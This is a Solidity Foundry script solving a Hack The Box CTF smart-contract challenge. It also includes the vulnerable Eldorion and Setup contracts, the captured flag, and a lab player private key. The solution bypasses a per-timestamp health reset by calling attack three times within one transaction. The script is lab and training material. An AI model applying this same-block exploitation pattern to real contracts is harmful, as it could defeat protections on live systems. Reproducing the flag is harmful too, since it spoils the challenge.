// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x36783871F9A62c29b5cfD38cf1476c9B7C8a8f4d);
    address wallet = 0x5A4Da0d3d360d5A8D5bf4b9fa69B11896af87924;
    Eldorion public target = setup.TARGET();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0xf6300f726fd2e9fc782065dd2c57c214c109daebf7c1af243af4e79e096fbf2c);

        new Hack(target);
        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}


contract Hack {
    constructor(Eldorion target) {
        target.attack(100);
        target.attack(100);
        target.attack(100);
    }
}

// Player Private Key : 0xf6300f726fd2e9fc782065dd2c57c214c109daebf7c1af243af4e79e096fbf2c
// Player Address     : 0x5A4Da0d3d360d5A8D5bf4b9fa69B11896af87924
// Target contract    : 0x86cfda608645432Dd024e4eE4888fb55121baaAa
// Setup contract     : 0x36783871F9A62c29b5cfD38cf1476c9B7C8a8f4d

contract Setup {
    Eldorion public immutable TARGET;
    
    event DeployedTarget(address at);

    constructor() payable {
        TARGET = new Eldorion();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return TARGET.isDefeated();
    }
}

// HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}

contract Eldorion {
    uint256 public health = 300;
    uint256 public lastAttackTimestamp;
    uint256 private constant MAX_HEALTH = 300;
    
    event EldorionDefeated(address slayer);
    
    modifier eternalResilience() {
        if (block.timestamp > lastAttackTimestamp) {
            health = MAX_HEALTH;
            lastAttackTimestamp = block.timestamp;
        }
        _;
    }
    
    function attack(uint256 damage) external eternalResilience {
        require(damage <= 100, "Mortals cannot strike harder than 100");
        require(health >= damage, "Overkill is wasteful");
        health -= damage;
        
        if (health == 0) {
            emit EldorionDefeated(msg.sender);
        }
    }

    function isDefeated() external view returns (bool) {
        return health == 0;
    }
}